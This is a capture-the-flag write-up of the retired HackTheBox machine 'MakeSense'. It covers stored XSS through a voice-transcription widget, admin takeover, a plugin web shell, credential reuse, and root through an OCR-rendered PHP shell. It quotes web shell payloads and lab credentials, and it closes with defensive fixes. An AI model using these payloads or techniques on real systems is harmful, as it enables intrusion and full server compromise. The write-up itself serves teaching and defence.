# MakeSense — write-up

> **HTB · Medium · retired.** Flags redacted; publishable.

A black-box run from a single IP. No prior knowledge of this machine's path; the
chain below was found by enumeration. The box names itself `makesense.htb` via
the TLS certificate — recorded, but it did not drive the search order.

## 1. Recon

Only two ports answer externally: `22` (OpenSSH 9.6p1) and `443`. Port `80` and
`8001` show `filtered`. 443 is Apache serving a WordPress 7.0 site, certificate
`CN=makesense.htb`. Added the host and moved on.

## 2. The voice assistant is the whole box

The front page is a web-agency brochure, but it carries a "Call WebAgency" voice
widget and an AI pipeline. Reading the theme JavaScript
(`wp-content/themes/webagency/assets/js/…`) tells the entire front-end story:

- `whisper-wrapper.js` runs Whisper (speech-to-text) and a summariser **in the
  browser** via Transformers.js, then encrypts the `{transcription, summary}`
  with AES-GCM. The key is **printed in the file**:
  `const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';`
- `main.js` posts the result to `admin-ajax.php?action=save_voice_results` with a
  nonce, after first creating a record via `submit_contact_form`.
- A code comment — "Map spoken words to their symbol equivalents **for XSS
  injection**" — is an unusually honest signpost: spoken "open bracket" becomes
  `<`, so you can *dictate* `<script>`. The author expected the stored text to
  land somewhere that renders HTML.

Two facts make this exploitable by an anonymous user:

1. The "encryption" is not a control. The key is client-side, so I can encrypt
   my own payload exactly as the browser would. The server decrypts with the
   same key and stores whatever I send.
2. `wp_create_nonce` for a logged-out user is stable, and the AJAX actions are
   registered for `nopriv`. The nonce printed in the page (`573bb05b6c`) is
   accepted.

The REST API confirms the storage model: a custom post type
`contact_submission` exists and is public, but the transcription/summary are in
**post meta**, not in the REST payload — i.e. they are shown only in wp-admin.

A benign test proved the plumbing: `submit_contact_form` → `post_id`, then
`save_voice_results` with my own AES-GCM blob → "Results saved successfully".
(`voice_submit.py`.)

## 3. Foothold: stored XSS → admin → `www-data`

Where does the stored text render? The theme's `functions.php` answers it
directly — the submission meta box does:

```php
echo '<p …>' . nl2br($summary) . '</p>';          // line 163
echo '<p …>' . nl2br($transcription) . '</p>';     // line 194
```

`nl2br` with no `esc_html` — raw HTML. So a submission whose "transcription" is
an HTML payload executes when the admin opens it. There is an automated reviewer
on the box (it opened my submission within a minute).

The payload has to work without knowing whether I can reach the attacker box, so
it stays same-origin: an `<img onerror>` that fetches `/wp-admin/user-new.php`,
scrapes the `_wpnonce_create-user` token, and POSTs a new **administrator**
`svcaudit` (`www/xss_transcription.txt`). Within ~60 s the account existed and I
could log in at `wp-login.php`.

From an admin session, code execution is a plugin upload: a one-file plugin
containing a tiny `system($_REQUEST['c'])` endpoint
(`upload_plugin.py`, `www/auditkit.zip`). Requesting
`/wp-content/plugins/auditkit/auditkit.php` returned `uid=33(www-data)`.

## 4. User: credential reuse

`wp-config.php` is a SQLite-backed install (`DB_FILE = .ht.sqlite`) with
`DB_USER = walter`, `DB_PASSWORD = JbhHDAEgXvri3!`. `walter` is also a Linux user
(uid 1000). The DB password is his login password:

```
ssh walter@… → uid=1000(walter); cat user.txt
```

**user.txt** — `<redacted>`

## 5. Root: a transform in the write path is still an arbitrary-content primitive

Local enumeration as `walter`: `sudo` is denied, nothing obvious in SUID/caps,
but `ps` shows the external-filtered `8001`:

```
root  php -S 127.0.0.1:8001 -t /root/ocr4/
```

A root web app behind HTTP Basic ("OCR Protected"). The Basic realm accepts
`walter:JbhHDAEgXvri3!` — the same reused password. The app lets you draw a word,
runs **tesseract** on the PNG, shows the recognised text, and offers "Save as
<filename>".

I probed the save sink hard and it is well-written *as far as paths go*: the
filename is `basename()`d (no traversal) and shell metacharacters are
neutralised (no command injection). But two things combine into root:

- The saved file keeps a chosen extension, and `php -S` **executes any `.php`
  under its document root** (`/root/ocr4`). The save directory `saved/` is under
  that root and web-served. So a `saved/x.php` with a PHP tag runs as root.
- The content is the OCR output, which looks "safe" because it has passed
  through a lossy transform. It is not. OCR is a function I can invert by tuning
  its *input*: I rendered `<?php system($_GET[0]);?>` in **Courier at 28 pt** and
  tesseract reproduced it byte-for-byte (measured locally across several
  fonts/sizes/PSM modes first — Courier 28 was exact).

Submitting that PNG, saving as `s.php`, then requesting
`/saved/s.php?0=id` returned `uid=0(root)`.

**root.txt** — `<redacted>`

## 6. Leads that didn't pan out (and why they mattered)

- *Path traversal / command injection in the OCR filename* — ruled out
  (`basename()` + sanitisation). Chasing it longer would have been wasted; the
  lesson was to pivot to the **content**, not the path.
- *Reaching the attacker box from the admin's browser* — never tested, because a
  same-origin payload removed the dependency. With 80/8001 filtered externally,
  assuming callbacks would have been a gamble.

## 7. The one-line fixes

`esc_html()` on the admin render kills the foothold. Not running the OCR tool as
root (or not serving a writable dir with a PHP SAPI) kills the root step.
Everything else is credential reuse.
